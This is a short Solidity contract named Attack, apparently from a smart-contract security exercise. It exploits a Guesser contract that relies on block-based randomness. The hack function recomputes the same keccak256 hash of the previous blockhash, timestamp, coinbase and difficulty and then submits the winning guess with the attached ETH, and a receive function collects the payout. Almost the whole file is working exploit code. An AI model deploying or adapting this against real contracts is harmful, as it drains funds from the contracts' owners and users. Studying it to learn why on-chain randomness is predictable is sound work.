// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Guesser.sol";

contract Attack {
    function hack(Guesser guesser) public payable {
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.coinbase,
                    block.difficulty,
                    block.coinbase
                )
            )
        );
        if (rand % 2 == 0) {
            guesser.guess{value: msg.value}(0);
        } else guesser.guess{value: msg.value}(1);
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
